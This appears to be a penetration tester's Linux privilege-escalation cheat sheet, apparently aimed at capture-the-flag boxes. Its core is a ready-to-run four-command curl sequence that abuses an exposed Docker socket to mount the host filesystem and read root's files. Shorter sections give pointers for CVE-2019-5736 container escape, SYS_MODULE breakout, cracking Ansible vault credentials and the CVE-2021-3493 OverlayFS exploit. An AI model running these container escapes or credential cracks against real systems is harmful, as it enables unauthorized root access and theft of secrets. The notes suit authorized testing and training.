# Linux

### Exposed [Docker Socket](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

```text
1) curl -i -s -k  -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "188a2704d8b0","Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}' http://localhost/containers/create --unix-socket /var/run/docker.sock
2) curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/start
3) curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/hostos/root/root.txt"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/<container_id>/exec --unix-socket /var/run/docker.sock 
4) curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/<exec_id>/start --unix-socket /var/run/docker.sock 
```

### Docker Exec

If you have a low privileged user and can do `sudo docker exec ...` chances are you can use [CVE-2019-5736](https://github.com/Frichetten/CVE-2019-5736-PoC) \(Ubuntu 18.04, Debian 9\) to escalate to root on the host. Modify main.go with your payload and execute in the container. Then do another `sudo docker exec ...` to trigger it.

### Docker Escape using SYS\_MODULE cap

{% embed url="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd" %}

### Ansible Credentials

Find & check "ansible.yml". Encrypted password can be converted with "ansible2john" and then decrypted:

```text
cat pw.txt | ansible-vault decrypt
```

### Ubuntu 20.04 OverlayFS Exploit CVE-2021-3493

[https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/)

Should work on most Ubuntus not patched after March 2021, tested on `4.15.0-132-generic #136-Ubuntu`.

### Resources

* [Privilege escalation using LD\_PRELOAD](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
* [Linux privilege escalation using shared libraries](https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library)
* [Abusing Shared Libraries](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html#but-can-we-exploit-it)



